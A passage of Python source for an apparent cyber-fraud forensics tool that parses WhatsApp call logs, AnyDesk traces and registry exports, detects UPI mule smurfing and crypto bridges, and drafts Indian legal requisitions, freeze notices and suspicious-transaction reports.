        predicted = sum(fit(r) for r, _ in hf)
        observed = sum(e for _, e in hf)
        zone_excess = observed / predicted if predicted > 0 else 0.0
        # 2x2 block at the Nyquist corner, where an upsampler's checkerboard concentrates
        corner = [(u, v) for u in (n - 2, n - 1) for v in (n - 2, n - 1)]
        peak_obs = sum(coef[u][v] ** 2 for u, v in corner) / 4.0
        peak_pred = sum(fit(math.hypot(u, v)) for u, v in corner) / 4.0
        peak_excess = peak_obs / peak_pred if peak_pred > 0 else 0.0
        relax = self.qp_relaxation(qp_used, alpha)
        t_zone, t_peak = self.HF_EXCESS_THRESHOLD * relax, self.NYQUIST_PEAK_THRESHOLD * relax
        flagged = zone_excess > t_zone or peak_excess > t_peak
        margin = max(zone_excess / t_zone, peak_excess / t_peak)
        return {
            "block_size": n, "spectral_alpha": _r(alpha), "alpha_in_natural_range": 1.5 <= alpha <= 2.5,
            "alpha_used_for_extrapolation": _r(alpha_extrap),
            "hf_zone_fraction_of_nyquist": self.HF_ZONE, "hf_energy_excess_ratio": _r(zone_excess),
            "nyquist_peak_excess_ratio": _r(peak_excess, 2), "qp_estimate": _r(qp_used, 1),
            "qp_source": "supplied" if qp is not None else "blockiness_heuristic",
            "qp_relaxation_factor": _r(relax), "hf_threshold_applied": _r(t_zone),
            "nyquist_peak_threshold_applied": _r(t_peak),
            "verdict": "GENERATIVE_UPSAMPLER_CHECKERBOARD" if flagged else "NATURAL_SPECTRAL_DECAY",
            "threat_score": _r(min(0.95, 0.75 + 0.05 * math.log2(margin))) if flagged else 0.0,
        }

    # ----- WhatsApp WebRTC (victim handset) -------------------------------- #

    MAX_LOG_BYTES = 64 * 1024 * 1024   # decompression cap for whatsapp.log.gz (logs rotate at a few MB)

    def parse_whatsapp_log(self, data: bytes, utc_offset_minutes: int = 330) -> Dict[str, Any]:
        """
        Extract ICE candidates and STUN/TURN servers from whatsapp.log (or .log.gz). Log timestamps
        are device-local; utc_offset_minutes converts them (IST = +330). IPv4, bracketed IPv6 and
        zone-scoped addresses are normalised. A truncated or oversized .gz yields what could be read
        plus an 'errors' entry; a malformed timestamp leaves that line's time empty.
        Offsets refer to the bytes actually parsed (the decompressed text for .gz input). The
        decompressed text is parsed in place (no second copy, no list of lines), so a gzip bomb costs
        at most MAX_LOG_BYTES of memory.
        """
        errors: List[str] = []
        if data[:2] == b"\x1f\x8b":
            out = bytearray()
            try:
                with gzip.GzipFile(fileobj=io.BytesIO(data)) as gz:
                    while True:   # never read past the cap (+1 byte to detect that it was exceeded)
                        chunk = gz.read(min(1 << 20, self.MAX_LOG_BYTES + 1 - len(out)))
                        if not chunk:
                            break
                        out.extend(chunk)
                        if len(out) > self.MAX_LOG_BYTES:
                            errors.append(f"decompressed size exceeds {self.MAX_LOG_BYTES} bytes; truncated")
                            del out[self.MAX_LOG_BYTES:]
                            break
            except (OSError, EOFError, zlib_error) as exc:
                errors.append(f"gzip stream damaged after {len(out)} bytes: {type(exc).__name__}")
            data = out  # type: ignore[assignment]  # parsed in place: bytes(out) would double the peak
        tz = datetime.timezone(datetime.timedelta(minutes=utc_offset_minutes))
        candidates, servers, call_id = [], {}, None
        for off, length, line in iter_lines(data):
            cm = _CALL_ID.search(line)
            if cm:
                call_id = cm.group(1)
            tm = _LOG_TS.match(line)
            ts = None
            if tm:
                try:
                    ts = iso_utc(parse_timestamp(tm.group(1), tz))
                except (ValueError, OverflowError, OSError):
                    errors.append(f"unparseable timestamp at byte {off}")
            for sm in _STUN_URI.finditer(line):
                key = f"{sm.group(1).lower()}:{sm.group(2)}:{sm.group(3) or ''}"
                servers.setdefault(key, {"scheme": sm.group(1).lower(), "host": sm.group(2).strip("[]"),
                                         "port": _to_int(sm.group(3)), "byte_offset": off, "length": length,
                                         "line_sha256": _sha256_hex(data[off:off + length])})
            m = _ICE_CANDIDATE.search(line)
            if not m:
                continue
            ip = normalize_ip(m.group(5))
            if ip is None:
                continue
            addr = ipaddress.ip_address(ip)
            candidates.append({
                "call_id": call_id, "timestamp_utc": ts, "direction": "REMOTE" if "remote" in line.lower() else "LOCAL",
                "foundation": m.group(1), "transport": m.group(3).upper(), "priority": int(m.group(4)),
                "ip": ip, "ip_version": addr.version, "port": int(m.group(6)), "type": m.group(7).lower(),
                "related_address": normalize_ip(m.group(8)), "related_port": _to_int(m.group(9)),
                "public": addr.is_global, "byte_offset": off, "length": length,
                "line_sha256": _sha256_hex(data[off:off + length]),
            })
        return {"candidates": candidates, "stun_turn_servers": list(servers.values()), "errors": errors}

    @staticmethod
    def requisition_targets(parsed: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Public reflexive endpoints of the remote party: the IP:port a CGNAT operator can resolve."""
        seen, out = set(), []
        for c in parsed["candidates"]:
            if c["direction"] == "REMOTE" and c["type"] in ("srflx", "prflx") and c["public"]:
                key = (c["ip"], c["port"])
                if key not in seen:
                    seen.add(key)
                    out.append(c)
        return out

    @staticmethod
    def build_sec94_requisition(case_id: str, candidate: Dict[str, Any], window_s: int = 300) -> Dict[str, Any]:
        """A timestamp that cannot bound a query window (unparseable, or year 1 minus 5 min) gives window None."""
        t: Optional[float] = None
        window: Optional[List[str]] = None
        if candidate.get("timestamp_utc"):
            try:
                t = parse_timestamp(candidate["timestamp_utc"])
                window = [iso_utc(t - window_s), iso_utc(t + window_s)]
            except (ValueError, TypeError, OverflowError, OSError):
                t, window = None, None
        req = {
            "statute": "Section 94, Bharatiya Nagarik Suraksha Sanhita, 2023 - summons to produce document or other thing",
            "case_reference": case_id,
            "addressee": f"Nodal Officer (Law Enforcement), ISP / TSP holding {candidate['ip']}",
            "ip_holder_resolution": "Resolve the allocation holder via IRINN / APNIC WHOIS before service",
            "target_public_ip": candidate["ip"],
            "target_port": candidate["port"],
            "transport": candidate["transport"],
            "ice_candidate_type": candidate["type"],
            "observed_timestamp_utc": candidate.get("timestamp_utc"),
            "query_window_utc": window,
            "call_id": candidate.get("call_id"),
            "data_sought": [
                "CGNAT / NAT translation log entry mapping the public IP and port to the internal IP for the window",
                "Subscriber details (CAF / KYC), MSISDN, IMSI and IMEI of the session holder",
                "IPDR session records (start/stop, bytes, APN) and serving cell ID for the window",
            ],
            "source_artifact": "WhatsApp whatsapp.log WebRTC ICE candidate",
        }
        req["notice_text"] = (
            f"Under Section 94 BNSS 2023, in {case_id}, you are required to produce the CGNAT translation "
            f"record, subscriber details and IPDR for public IP {candidate['ip']} port {candidate['port']} "
            f"({candidate['transport']}) between {window[0] if window else 'N/A'} and "
            f"{window[1] if window else 'N/A'} UTC.")
        return req

    @staticmethod
    def msgstore_uri(db_path: str) -> str:
        """
        Read-only, immutable SQLite URI with the path percent-encoded, so '#', '%', '?' and spaces in a
        case folder ('FIR #42') cannot cut off the mode=ro&immutable=1 query. Drive paths become
        file:///C:/..., UNC paths file:////server/share/... (empty authority, which SQLite accepts).
        """
        p = os.path.abspath(db_path).replace("\\", "/")
        if not p.startswith("/"):
            p = "/" + p
        return "file://" + urllib.parse.quote(p, safe="/:") + "?mode=ro&immutable=1"

    @staticmethod
    def parse_msgstore_calls(db_path: str) -> List[Dict[str, Any]]:
        """Read call_log rows from a WhatsApp msgstore.db copy (opened read-only, immutable)."""
        if not os.path.isfile(db_path):
            raise FileNotFoundError(f"msgstore database not found: {db_path}")
        con = sqlite3.connect(DeepfakeTriageEngine.msgstore_uri(db_path), uri=True)
        try:
            cols = [r[1] for r in con.execute("PRAGMA table_info(call_log)")]
            if not cols:
                return []
            want = [c for c in ("_id", "call_id", "timestamp", "video_call", "duration", "call_result",
                                "from_me", "jid_row_id") if c in cols]
            rows = con.execute(f"SELECT {', '.join(want)} FROM call_log ORDER BY timestamp").fetchall()
            out = []
            for row in rows:
                d = dict(zip(want, row))
                if "timestamp" in d and d["timestamp"]:
                    try:
                        d["timestamp_utc"] = iso_utc(d["timestamp"] / 1000.0)
                    except (ValueError, TypeError, OverflowError, OSError):
                        d["timestamp_utc"] = None   # absurd or non-numeric call time: keep the row
                out.append(d)
            return out
        finally:
            con.close()

    # ----- seized scam-centre rig ------------------------------------------ #

    def scan_registry_export(self, data: bytes) -> List[Dict[str, Any]]:
        """Find virtual camera filters in a .reg export (UTF-16LE or UTF-8)."""
        text, to_byte = decode_text_with_offsets(data)
        hits, key, key_pos, pos = [], "", 0, 0
        for line in text.splitlines(keepends=True):
            s = line.strip()
            if s.startswith("[") and s.endswith("]"):
                key, key_pos = s[1:-1], pos
            else:
                m = re.match(r'^"FriendlyName"="(.*)"$', s, re.I) or re.match(r'^@="(.*)"$', s)
                if m and any(name in m.group(1).lower() for name in VIRTUAL_CAMERA_NAMES):
                    in_category = VIDEO_INPUT_CATEGORY in key.lower() and "\\instance" in key.lower()
                    start = to_byte(key_pos)
                    hits.append({"registry_key": _clean(key), "friendly_name": _clean(m.group(1)),
                                 "video_input_device_category": in_category,
                                 "score": 0.85 if in_category else 0.65,
                                 "byte_offset": start, "length": to_byte(pos + len(line.rstrip("\r\n"))) - start})
            pos += len(line)
        return hits

    @staticmethod
    def parse_anydesk_trace(data: bytes) -> List[Dict[str, Any]]:
        """%ProgramData%\\AnyDesk\\connection_trace.txt: direction, date, time, auth, two AnyDesk IDs."""
        text, to_byte = decode_text_with_offsets(data)
        out, pos = [], 0
        for line in text.splitlines(keepends=True):
            m = _ANYDESK_LINE.match(line)
            if m:
                body = line.rstrip("\r\n")
                hhmm = m.group(3) if m.group(3).count(":") == 2 else m.group(3) + ":00"
                out.append({"direction": m.group(1).upper(), "timestamp_local": f"{m.group(2)}T{hhmm}",
                            "authentication": _clean(m.group(4)), "remote_client_id": m.group(5),
                            "secondary_id": m.group(6), "byte_offset": to_byte(pos),
                            "length": to_byte(pos + len(body)) - to_byte(pos)})
            pos += len(line)
        return out


# --------------------------------------------------------------------------- #
# Sub-engine 3: Financial mule network & UPI smurfing                         #
# --------------------------------------------------------------------------- #

_NOTE_SERIAL = re.compile(r"^[0-9]{2}[A-HJ-NP-Z]\s?(?!000000)[0-9]{6}$")
_NOTE_SCAN = re.compile(r"(?<![A-Za-z0-9_./@\\#:\-])([0-9]{2}[A-HJ-NP-Z])\s?((?!000000)[0-9]{6})(?![A-Za-z0-9_@\\\-]|[./]\w|:\d)")
_REFERENCE_LABEL = re.compile(
    r"\b(?:inv(?:oice)?|ord(?:er)?|gst(?:in)?|awb|utr|ref(?:erence)?|txn|pnr|bill|receipt|challan|docket|"
    r"tracking|po)\b\s*(?:no\.?|number|#|id)?\s*[:#.\-]?\s*$", re.I)


class FinancialMuleDetector:
    """RRNs, fan-out smurfing, UPI-to-USDT bridges, hawala tokens and statutory freeze/STR blocks."""

    SMURF_MIN_INFLOW = 100000.0
    SMURF_WINDOW_S = 180.0
    SMURF_MIN_MULES = 3
    SMURF_RATIO = (0.85, 1.05)
    TAU_ESCROW_S = 300.0
    P2P_PREMIUM = (0.015, 0.085)
    PREMIUM_EPS = 0.005

    def __init__(self, usdt_inr_rate: float = 84.0, reference_year: int = 2026):
        self.usdt_inr_rate = usdt_inr_rate
        self.reference_year = reference_year

    # ----- NPCI RRN -------------------------------------------------------- #

    def validate_rrn(self, rrn: Any, txn_epoch: Optional[float] = None, tz_naive: bool = False) -> Dict[str, Any]:
        """
        RRN = Y DDD HH SSSSSS (last digit of year, Julian day, IST hour, 6-digit STAN).
        With a transaction time, the year is the one nearest that time whose last digit is Y, and the
        RRN hour is turned into an absolute IST hour window: the transaction must fall within one hour
        of that window, so midnight, year-end and leap-day rollovers are not false alarms.
        STAN 000000 is reserved and rejected. A transaction time or inferred year outside years
        1..9999 makes the RRN invalid with a reason instead of raising. tz_naive=True (a zone-less
        bank timestamp read as UTC) also tries the IST reading of that time, as the bridge matcher
        does, and records which reading fitted in timestamp_basis.
        """
        res = self._validate_rrn(rrn, txn_epoch)
        if tz_naive and txn_epoch is not None and not res["valid"] and _finite(txn_epoch):
            alt = self._validate_rrn(rrn, float(txn_epoch) - self.IST_OFFSET_S)
            if alt["valid"]:
                return dict(alt, timestamp_basis="NAIVE_TIMESTAMP_READ_AS_IST")
        if tz_naive and txn_epoch is not None:
            res["timestamp_basis"] = "AS_RECORDED"
        return res

    def _validate_rrn(self, rrn: Any, txn_epoch: Optional[float] = None) -> Dict[str, Any]:
        s = str(rrn).strip()
        reasons: List[str] = []
        if not re.fullmatch(r"\d{12}", s):
            return {"rrn": s, "valid": False, "reasons": ["RRN must be exactly 12 digits"]}
        y, ddd, hh, stan = int(s[0]), int(s[1:4]), int(s[4:6]), s[6:]
        ist = datetime.timezone(datetime.timedelta(minutes=330))
        txn_dt = None
        anchor_year = self.reference_year
        if txn_epoch is not None and _finite(txn_epoch) and txn_epoch > 0:
            try:
                txn_dt = _utc_datetime(txn_epoch).astimezone(ist)   # no gmtime(): same on Windows
                anchor_year = txn_dt.year
            except (ValueError, OverflowError, OSError):
                return {"rrn": s, "valid": False,
                        "reasons": ["transaction time out of range (outside years 1..9999)"]}
        year = min((anchor_year + k for k in range(-9, 10) if (anchor_year + k) % 10 == y
                    and datetime.MINYEAR <= anchor_year + k <= datetime.MAXYEAR),
                   key=lambda yr: (abs(yr - anchor_year), -yr))
        leap = year % 4 == 0 and (year % 100 != 0 or year % 400 == 0)
        if not 1 <= ddd <= (366 if leap else 365):
            reasons.append(f"Julian day {ddd:03d} impossible in {year}")
        if hh > 23:
            reasons.append(f"Hour {hh:02d} > 23")
        if stan == "000000":
            reasons.append("STAN 000000 is reserved")
        decoded = {"year_digit": y, "inferred_year": year, "julian_day": ddd, "hour": hh, "stan": stan}
        if not reasons:
            try:
                start = datetime.datetime(year, 1, 1, tzinfo=ist) + datetime.timedelta(days=ddd - 1, hours=hh)
                window = [iso_utc(start.timestamp()), iso_utc(start.timestamp() + 3600)]
            except (ValueError, OverflowError, OSError):
                reasons.append("transaction time / inferred year out of range")
                return {"rrn": s, "valid": False, "reasons": reasons, "decoded": decoded}
            decoded["inferred_date"] = start.date().isoformat()
            decoded["rrn_hour_window_utc"] = window
            if txn_dt is not None:
                t0 = start.timestamp()
                if not (t0 - 3600 <= txn_epoch <= t0 + 2 * 3600):
                    reasons.append("RRN date/hour is more than one hour away from the transaction time (IST)")
        return {"rrn": s, "valid": not reasons, "reasons": reasons, "decoded": decoded}

    # ----- transaction ingestion ------------------------------------------- #

    @staticmethod
    def _parse_csv(data: bytes, amount_key: str, errors: Optional[List[str]] = None) -> List[Dict[str, Any]]:
        """CSV rows with their byte ranges; malformed rows (bad time, NaN/negative amount) are skipped and reported."""
        rows: List[Dict[str, Any]] = []
        header = None
        for off, length, line in iter_lines(data):
            if not line.strip():
                continue
            try:
                fields = next(csv.reader([line]))
            except (csv.Error, StopIteration):
                if errors is not None:
                    errors.append(f"unparseable CSV line at byte {off}")
                continue
            if header is None:
                header = [h.strip().lower().lstrip("\ufeff") for h in fields]
                continue
            r = dict(zip(header, (f.strip() for f in fields)))
            ts_raw = r.get("timestamp_utc") or r.get("timestamp_ist") or r.get("timestamp") or ""
            try:
                amount = float(r.get(amount_key, "") or "nan")
                naive = not re.search(r"(Z|[+-]\d{2}:?\d{2})$", ts_raw.strip())
                tz = (datetime.timezone(datetime.timedelta(minutes=330)) if "timestamp_ist" in r
                      else datetime.timezone.utc)
                epoch = parse_timestamp(ts_raw, tz)
                ts_utc = iso_utc(epoch) if math.isfinite(epoch) else None   # inside the row's try: one bad
            except (ValueError, TypeError, OverflowError, OSError):         # date drops one row, not the file
                if errors is not None:
                    errors.append(f"bad timestamp or amount at byte {off}")
                continue
            if not (math.isfinite(amount) and amount > 0 and math.isfinite(epoch) and epoch > 0):
                if errors is not None:
                    errors.append(f"non-finite, non-positive amount or epoch at byte {off}")
                continue
            r[amount_key] = amount
            r["epoch"] = epoch
            r["timestamp_utc"] = ts_utc
            r["tz_naive"] = naive and "timestamp_ist" not in r
            r["_offset"], r["_length"] = off, length
            rows.append(r)
        return rows

    @classmethod
    def parse_upi_csv(cls, data: bytes, errors: Optional[List[str]] = None) -> List[Dict[str, Any]]:
        """
        Columns: txn_id, rrn, timestamp_utc (or timestamp_ist), payer_vpa, payee_vpa, amount_inr,
        payee_ifsc. A naive timestamp_utc is read as UTC but marked tz_naive, so the bridge matcher can
        also try the IST reading.
        """
        return cls._parse_csv(data, "amount_inr", errors)

    @classmethod
    def parse_chain_csv(cls, data: bytes, errors: Optional[List[str]] = None) -> List[Dict[str, Any]]:
        """Columns: tx_hash, chain, timestamp_utc, from_address, to_address, amount_usdt."""
        return cls._parse_csv(data, "amount_usdt", errors)

    # ----- fan-out smurfing ------------------------------------------------ #

    def detect_smurfing(self, txns: Sequence[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """
        For each hub inflow, collect outflows to distinct VPAs within SMURF_WINDOW_S. Each outflow and
        inflow is used by at most one alert (no duplicate freeze notices). When one inflow cannot
        explain the dispersal (ratio above SMURF_RATIO), other unused inflows to the same hub inside
        the window are pooled before the ratio is tested, which catches split-inflow layering.
        """
        clean = [t for t in txns if _finite(t.get("epoch")) and t["epoch"] > 0 and _finite(t.get("amount_inr"))
                 and t["amount_inr"] > 0 and t.get("payer_vpa") and t.get("payee_vpa")]
        clean.sort(key=lambda t: (t["epoch"], str(t.get("txn_id", ""))))
        # Time index per payer / payee (positions in 'clean', ascending), so each inflow only looks at
        # its own hub's rows inside the window instead of rescanning every row (was O(n^2)).
        by_payer: Dict[str, List[int]] = defaultdict(list)
        by_payee: Dict[str, List[int]] = defaultdict(list)
        for i, t in enumerate(clean):
            by_payer[t["payer_vpa"].lower()].append(i)
            by_payee[t["payee_vpa"].lower()].append(i)
        ep_payer = {k: [float(clean[i]["epoch"]) for i in v] for k, v in by_payer.items()}
        ep_payee = {k: [float(clean[i]["epoch"]) for i in v] for k, v in by_payee.items()}

        def window(index: Dict[str, List[int]], eps: Dict[str, List[float]], key: str,
                   lo: float, hi: float) -> List[Dict[str, Any]]:
            """Rows of 'key' with lo <= epoch <= hi (a superset; callers re-test exactly), in 'clean' order."""
            e = eps.get(key)
            if not e:
                return []
            return [clean[i] for i in index[key][bisect.bisect_left(e, lo):bisect.bisect_right(e, hi)]]

        used: set = set()
        alerts = []
        for first in clean:
            if id(first) in used:
                continue
            hub, t0 = first["payee_vpa"].lower(), first["epoch"]
            outs = [t for t in window(by_payer, ep_payer, hub, t0, t0 + self.SMURF_WINDOW_S + 1.0)
                    if id(t) not in used and t["payer_vpa"].lower() == hub
                    and 0 <= t["epoch"] - t0 <= self.SMURF_WINDOW_S]
            if not outs:
                continue
            last_out = max(t["epoch"] for t in outs)
            inflows = [first]
            total_in = first["amount_inr"]
            total_out = sum(t["amount_inr"] for t in outs)
            if total_out / total_in > self.SMURF_RATIO[1]:
                for t in window(by_payee, ep_payee, hub, t0, last_out):
                    if (t is not first and id(t) not in used and t["payee_vpa"].lower() == hub
                            and t0 <= t["epoch"] <= last_out and t["payer_vpa"].lower() != hub):
                        inflows.append(t)
                        total_in += t["amount_inr"]
                        if total_out / total_in <= self.SMURF_RATIO[1]:
                            break
            if total_in < self.SMURF_MIN_INFLOW:
                continue
            payers = {t["payer_vpa"].lower() for t in inflows}
            outs = [t for t in outs if t["payee_vpa"].lower() not in payers]
            mules = sorted({t["payee_vpa"].lower() for t in outs})
            if len(mules) < self.SMURF_MIN_MULES:
                continue
            ratio = sum(t["amount_inr"] for t in outs) / total_in
            if not self.SMURF_RATIO[0] <= ratio <= self.SMURF_RATIO[1]:
                continue
            for t in inflows + outs:
                used.add(id(t))
            span = max(t["epoch"] for t in outs) - t0
            score = min(0.99, 0.80 + 0.03 * (len(mules) - self.SMURF_MIN_MULES)
                        + 0.05 * (1 - abs(1 - ratio) / 0.15) + 0.04 * (1 - span / self.SMURF_WINDOW_S))
            alerts.append({
                "alert": "RAPID_FAN_OUT_SMURFING", "hub_vpa": hub, "inflow": _txn_view(first),
                "pooled_inflows": [_txn_view(t) for t in inflows[1:]],
                "total_inflow_inr": _r(total_in, 2),
                "outflows": [_txn_view(t) for t in outs], "flagged_mules": mules,
                "dispersion_ratio": _r(ratio), "dispersal_span_s": _r(span, 1), "threat_score": _r(score),
                "start_epoch": t0, "rows": inflows + outs,
            })
        # layer numbering: a later alert whose hub was a mule of an earlier alert is one tier deeper
        for a in alerts:
            a["tier"] = 1
        for a in alerts:  # alerts are in time order, so parents are numbered before children
            for b_ in alerts:
                if b_ is not a and b_["hub_vpa"] in a["flagged_mules"] and b_["start_epoch"] >= a["start_epoch"]:
                    b_["tier"] = max(b_["tier"], a["tier"] + 1)
        for a in alerts:
            a.pop("start_epoch")
        return alerts

    # ----- UPI <-> USDT bridge --------------------------------------------- #

    CLOCK_SKEW_S = 30.0
    IST_OFFSET_S = 19800.0

    def bridge_affinity(self, upi: Dict[str, Any], chain: Dict[str, Any]) -> Dict[str, Any]:
        """
        A(e_upi, e_chain) = exp(-|dt| / tau_escrow) * I(P2P premium in window), for
        -CLOCK_SKEW_S <= dt <= tau_escrow. A naive (zone-less) UPI timestamp is also tried as IST,
        and the reading with the higher affinity is reported.
        """
        implied = upi["amount_inr"] / chain["amount_usdt"] if chain.get("amount_usdt") else float("inf")
        premium = implied / self.usdt_inr_rate - 1.0
        rate_ok = self.P2P_PREMIUM[0] - self.PREMIUM_EPS <= premium <= self.P2P_PREMIUM[1] + self.PREMIUM_EPS
        readings = [("AS_RECORDED", chain["epoch"] - upi["epoch"])]
        if upi.get("tz_naive"):
            readings.append(("NAIVE_TIMESTAMP_READ_AS_IST", chain["epoch"] - (upi["epoch"] - self.IST_OFFSET_S)))
        best = None
        for basis, dt in readings:
            in_window = -self.CLOCK_SKEW_S <= dt <= self.TAU_ESCROW_S
            aff = math.exp(-abs(dt) / self.TAU_ESCROW_S) if (rate_ok and in_window) else 0.0
            if best is None or aff > best[2]:
                best = (basis, dt, aff)
        basis, dt, affinity = best  # type: ignore[misc]
        return {"delta_t_s": _r(dt, 1), "timestamp_basis": basis, "implied_inr_per_usdt": _r(implied, 3),
                "p2p_premium": _r(premium), "rate_window_ok": rate_ok, "affinity": _r(affinity)}

    def match_bridges(self, upi_txns: Sequence[Dict[str, Any]], chain_txns: Sequence[Dict[str, Any]]
                      ) -> List[Dict[str, Any]]:
        """
        One-to-one greedy match by affinity; requires dt within [-30 s skew, tau_escrow] (affinity >= e^-1).
        Chain rows are indexed by time, so each UPI row is only scored against chain rows inside its
        window(s) (the as-recorded one and, for naive timestamps, the IST-shifted one) instead of
        every chain row (was O(n x m)). Candidates are visited in chain_txns order, so ties sort as before.
        """
        floor = math.exp(-1.0)
        pairs = []
        chain_ok = [(float(c["epoch"]), j) for j, c in enumerate(chain_txns)
                    if _finite(c.get("epoch")) and _finite(c.get("amount_usdt")) and c["amount_usdt"] > 0]
        chain_ok.sort()
        c_ep = [e for e, _ in chain_ok]
        margin = 1.0   # superset; the affinity test below is the exact one

        def near(t: float) -> List[int]:
            lo = bisect.bisect_left(c_ep, t - self.CLOCK_SKEW_S - margin)
            hi = bisect.bisect_right(c_ep, t + self.TAU_ESCROW_S + margin)
            return [j for _, j in chain_ok[lo:hi]]

        for u in upi_txns:
            if not (_finite(u.get("epoch")) and _finite(u.get("amount_inr"))):
                continue
            cand = set(near(float(u["epoch"])))
            if u.get("tz_naive"):
                cand.update(near(float(u["epoch"]) - self.IST_OFFSET_S))
            for j in sorted(cand):
                c = chain_txns[j]
                a = self.bridge_affinity(u, c)
                if a["affinity"] >= floor - 1e-9:
                    pairs.append((a["affinity"], u, c, a))
        pairs.sort(key=lambda p: (-p[0], str(p[1].get("rrn", "")), str(p[2].get("tx_hash", ""))))
        used_u, used_c, out = set(), set(), []
        for aff, u, c, a in pairs:
            if id(u) in used_u or id(c) in used_c:
                continue
            used_u.add(id(u))
            used_c.add(id(c))
            out.append({"alert": "CROSS_CHAIN_BRIDGE_MATCH", "upi": _txn_view(u),
                        "chain": {k: c.get(k) for k in ("tx_hash", "chain", "timestamp_utc", "from_address",
                                                         "to_address", "amount_usdt")},
                        "threat_score": _r(0.70 + 0.25 * aff), **a, "rows": [u, c]})
        return out

    # ----- mirror hawala --------------------------------------------------- #

    @staticmethod
    def is_note_serial(token: str) -> bool:
        """RBI pattern 2 digits + inset letter (no I/O) + optional space + 6-digit serial 000001-999999."""
        return bool(_NOTE_SERIAL.match(token))

    @staticmethod
    def extract_hawala_tokens(data: bytes) -> List[Dict[str, Any]]:
        """
        Currency-note serials shared as physical hand-over bearer tokens in chats / OCR text. Tokens
        glued to identifiers (INV-, ORD/, @vpa, _IMG, .jpg) or introduced by invoice/order/GST/AWB/UTR
        style labels are not counted.
        """
        text, to_byte = decode_text_with_offsets(data)
        out = []
        for m in _NOTE_SCAN.finditer(text):
            line_start = text.rfind("\n", 0, m.start()) + 1
            line_end = text.find("\n", m.end())
            line_end = len(text) if line_end < 0 else line_end
            if _REFERENCE_LABEL.search(text[max(line_start, m.start() - 24):m.start()]):
                continue
            out.append({"serial": _clean(m.group(0)), "normalized": m.group(1) + m.group(2),
                        "byte_offset": to_byte(m.start()), "length": to_byte(m.end()) - to_byte(m.start()),
                        "context": _clean(text[line_start:line_end].strip()[:160])})
        return out

    # ----- statutory output ------------------------------------------------ #

    FREEZE_FIELDS = ("payee_vpa", "payee_ifsc", "rrn", "amount_inr", "timestamp_utc")
    FREEZE_NOTICE_STATUS = "PRELIMINARY_TRIAGE_VIEW_SUPERSEDED_BY_SECTOR_D"
    STR_STATUTE = ("Section 12, Prevention of Money-laundering Act, 2002 read with Rule 8, "
                   "Prevention of Money-laundering (Maintenance of Records) Rules, 2005")

    def build_freeze_notice(self, case_id: str, alert: Dict[str, Any]) -> Dict[str, Any]:
        entries, missing = [], []
        for t in alert["outflows"]:
            gaps = [f for f in self.FREEZE_FIELDS if t.get(f) in (None, "")]
            missing.extend(f"{t.get('txn_id')}:{g}" for g in gaps)
            entries.append({"beneficiary_vpa": t.get("payee_vpa"), "beneficiary_ifsc": t.get("payee_ifsc"),
                            "bank_code": (t.get("payee_ifsc") or "")[:4] or None, "npci_rrn": t.get("rrn"),
                            "amount_inr": t.get("amount_inr"), "credited_at_utc": t.get("timestamp_utc"),
                            "action": "DEBIT_FREEZE_AND_LIEN"})
        return {
            "statute": "Section 106, Bharatiya Nagarik Suraksha Sanhita, 2023 - seizure of property; "
                       "I4C CFCFRMS / National Cyber Crime Helpline 1930",
            # Triage view only: gross credits to first-tier mules, onward legs not netted. The notice to
            # serve is Sector D's (net tainted balance per account, hub and onward beneficiaries included),
            # so the two can never stand side by side as conflicting freeze instructions.
            "notice_status": self.FREEZE_NOTICE_STATUS,
            "amount_basis": "GROSS_CREDIT_TO_FIRST_TIER_MULES (onward transfers not netted)",
            "authoritative_notice": "Sector D (sector_d_legal.py) Section 106 BNSS freeze notice",
            "case_reference": case_id,
            "addressee": "Nodal Officers of the beneficiary banks (via CFCFRMS)",
            "victim_inflow": {"rrn": alert["inflow"].get("rrn"), "amount_inr": alert["inflow"].get("amount_inr"),
                              "hub_vpa": alert["hub_vpa"], "timestamp_utc": alert["inflow"].get("timestamp_utc")},
            "freeze_entries": entries,
            "total_amount_to_freeze_inr": _r(sum(e["amount_inr"] or 0 for e in entries), 2),
            "fields_complete": not missing, "missing_fields": missing,
        }

    def build_fiu_str_xml(self, case_id: str, alert: Dict[str, Any]) -> str:
        """FINnet 2.0 STR summary for the reporting entity's Principal Officer (not the FIU-IND schema file)."""
        root = ET.Element("STRSummary", {"framework": "FIU-IND FINnet 2.0", "version": "1.0"})
        ET.SubElement(root, "CaseReference").text = _xml_text(case_id)
        ET.SubElement(root, "Statute").text = self.STR_STATUTE   # same citation as Sector D's filed STR
        ET.SubElement(root, "SuspicionCategory").text = "RAPID_FAN_OUT_SMURFING"
        ET.SubElement(root, "GroundsOfSuspicion").text = _xml_text(
            f"Inflow of INR {alert['inflow']['amount_inr']:.2f} to {alert['hub_vpa']} dispersed to "
            f"{len(alert['flagged_mules'])} accounts within {alert['dispersal_span_s']} s "
            f"(dispersion ratio {alert['dispersion_ratio']}).")
        accts = ET.SubElement(root, "SuspectAccounts")
        ET.SubElement(accts, "Account", {"role": "HUB"}).text = _xml_text(alert["hub_vpa"])
        for m in alert["flagged_mules"]:
            ET.SubElement(accts, "Account", {"role": "MULE"}).text = _xml_text(m)
        txs = ET.SubElement(root, "Transactions")
        for t in [alert["inflow"]] + alert["outflows"]:
            tx = ET.SubElement(txs, "Transaction")
            for tag, key in (("RRN", "rrn"), ("DateTimeUTC", "timestamp_utc"), ("PayerVPA", "payer_vpa"),
                             ("PayeeVPA", "payee_vpa"), ("PayeeIFSC", "payee_ifsc")):
                ET.SubElement(tx, tag).text = _xml_text(str(t.get(key) or ""))
            ET.SubElement(tx, "Amount", {"currency": "INR"}).text = f"{t.get('amount_inr', 0):.2f}"
        return ET.tostring(root, encoding="unicode")


_XML_ILLEGAL = re.compile("[\x00-\x08\x0b\x0c\x0e-\x1f\ud800-\udfff\ufffe\uffff]")


def _xml_text(s: Any) -> str:
    """Text safe for XML 1.0: control characters and lone surrogates become U+FFFD (ElementTree passes them through)."""
    return _XML_ILLEGAL.sub("\ufffd", str(s))


def str_xml_check(xml_text: str) -> List[str]:
    """Problems that keep a generated STR XML from being filed: not well-formed, or a field had to be repaired."""
    problems = []
    try:
        ET.fromstring(xml_text)
    except ET.ParseError as exc:
        problems.append(f"STR XML not well-formed: {exc}")
    if "\ufffd" in xml_text:
        problems.append("a field contained XML-illegal or undecodable characters (shown as U+FFFD); "
                        "correct the source row before filing")
    return problems


def _txn_view(t: Dict[str, Any]) -> Dict[str, Any]:
    return {k: t.get(k) for k in ("txn_id", "rrn", "timestamp_utc", "payer_vpa", "payee_vpa", "amount_inr",
                                  "payee_ifsc")}


# --------------------------------------------------------------------------- #
